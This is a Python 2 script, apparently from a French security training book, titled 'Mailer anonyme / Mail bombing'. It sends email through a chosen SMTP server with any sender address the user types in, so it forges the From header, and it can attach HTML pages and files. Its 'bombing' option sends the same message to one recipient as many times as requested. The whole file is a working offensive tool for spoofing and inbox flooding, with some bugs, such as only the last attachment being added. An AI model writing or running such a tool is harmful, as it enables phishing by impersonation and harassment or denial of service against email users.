#! /bin/python
# -*- coding:UTF-8 -*-

# CDAISI 2011-2012

import os
import smtplib
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEImage import MIMEImage
import mimetypes, posixpath
from email import Utils

destinataire = ""
expediteur = ""
sujet = ""
date = ""
message = ""
serveur = ""
fichierHTML = ""
fichier = ""



def setInformations():
	print "\n"
	serveur = raw_input("-> Serveur SMTP : ")
	destinataire = raw_input("-> Destinataire : ")
	expediteur = raw_input("-> Expéditeur : ")
	sujet = raw_input("-> Sujet : ")
	#message = raw_input("-> Message : ")
	date = raw_input("-> Date : ")
	return serveur, destinataire, expediteur, sujet, message, date	


def initInformations():
	destinataire = ""
	expediteur = ""
	sujet = ""
	date = ""
	message = ""
	serveur = ""
	fichierHTML = ""
	fichier = ""


def simple():
	infos = setInformations()
	message = raw_input("-> Message : ")	

	# creation du mail
	mail = MIMEText(message)
	mail['From'] = infos[2]
	mail['Subject'] = infos[3]
	mail['To'] = infos[1]
	mail['Date'] = infos[5]
	mail['Message-ID'] = Utils.make_msgid()

	serv = smtplib.SMTP(infos[0])
	print "Configuration du serveur smtp"
	
	serv.sendmail(infos[2], infos[1], mail.as_string())
	print "le message est envoyé"
	serv.quit()


def simpleHTML():
	#initInformations()
	infos = setInformations()
	fichierHTML = open(raw_input("-> Chemin de la page HTML : "), "r").read()
	
	print fichierHTML	

	# creation d'un objet multipart
        emailmultipart = MIMEMultipart()
        # on ajoute les headers pour le mail principal
        emailmultipart['From'] = infos[2]
        emailmultipart['To'] = infos[1]
        emailmultipart['Subject'] = infos[3]
        # on crer un message simple en HTML
        emailtext = MIMEText(fichierHTML, 'html')
        # on attache ce mail à notre multipart
        emailmultipart.attach(emailtext)

        # on envoit le mail
        serveur = smtplib.SMTP(infos[0])
        serveur.sendmail(infos[2], infos[1], emailmultipart.as_string())
        serveur.quit()


def doubleHTML():
	liste_fichiers = []
	initInformations()
        infos = setInformations()
        fichierHTML = open(raw_input("-> Chemin de la page HTML : "), "r").read()
	nbFichier = raw_input("-> Combien de pièces à envoyer : ")
	for i in range(int(nbFichier)):
		liste_fichiers.append(raw_input("\tFichier " + str(i) + " : "))
	#fichier = raw_input("-> Chemin du fichier à envoyer : ")

        # creation d'un objet multipart
        emailmultipart = MIMEMultipart()
        # on ajoute les headers pour le mail principal
        emailmultipart['From'] = infos[2]
        emailmultipart['To'] = infos[1]
        emailmultipart['Subject'] = infos[3]
        # on crer un message simple en HTML
        emailtext = MIMEText(fichierHTML, 'html')
        # on attache ce mail à notre multipart
        emailmultipart.attach(emailtext)

	for l in liste_fichiers:
		part = MIMEBase('application', "octet-stream")
		print l
		part.set_payload(open(l, "rb").read())
		#Encoders.encode_base(part)
		part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(l))
		
	emailmultipart.attach(part)	

        # on envoit le mail
	print "Connexion au serveur de mail"
        serveur = smtplib.SMTP(infos[0])
	print "Configuration du mail"
        serveur.sendmail(infos[2], infos[1], emailmultipart.as_string())
        print "Message envoyé"
	serveur.quit()

def bombing():
	liste_fichiers = []
        #initInformations()
        infos = setInformations()
	message = raw_input("-> Message : ")
        nbFichier = raw_input("-> Combien de pièces à envoyer : ")
        for i in range(int(nbFichier)):
                liste_fichiers.append(raw_input("\tFichier " + str(i) + " : "))
        
        # creation d'un objet multipart
        emailmultipart = MIMEMultipart()
        # on ajoute les headers pour le mail principal
        emailmultipart['From'] = infos[2]
        emailmultipart['To'] = infos[1]
        emailmultipart['Subject'] = infos[3]
        # on crer un message simple en HTML
        emailtext = MIMEText(message, 'html')
        # on attache ce mail à notre multipart
        emailmultipart.attach(emailtext)

        for l in liste_fichiers:
                part = MIMEBase('application', "octet-stream")
                print l
                part.set_payload(open(l, "rb").read())
                #Encoders.encode_base(part)
                part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(l))

        emailmultipart.attach(part)
	
	nombre = raw_input("-> Nombre de mails à envoyer : ")

	 # on envoit le mail
        print "Connexion au serveur de mail"
        serveur = smtplib.SMTP(infos[0])
        print "Configuration du mail"
	for i in range(int(nombre)):
        	serveur.sendmail(infos[2], infos[1], emailmultipart.as_string())
        print "Message envoyé"
        serveur.quit()



def menu():
	os.system("clear")
	print "**************************************"
	print "*           MAILER ANONYME           *"
	print "*            MAIL BOMBING            *"
	print "*         ------------------         *"
	print "*           Eni Edition              *"
	print "**************************************"
	print ""
	print "[+] 1 - Envoyer un simple mail anonyme"
	print "[+] 2 - Envoyer un mail anonyme en HTML"
	print "[+] 3 - Envoyer un mail anonyme en HTML avec pièce jointe"
	print "[+] 4 - Mail Bombing"
	print "---------------------------------------------------------"
	choix = int(raw_input("Choix > "))
	

	if (choix == 1):
		simple()
	elif (choix == 2):
		simpleHTML()
	elif (choix == 3):
		doubleHTML()
	elif (choix == 4):
		bombing()
		menu()
	else:
		menu()	
	




if __name__ == "__main__":
	menu()
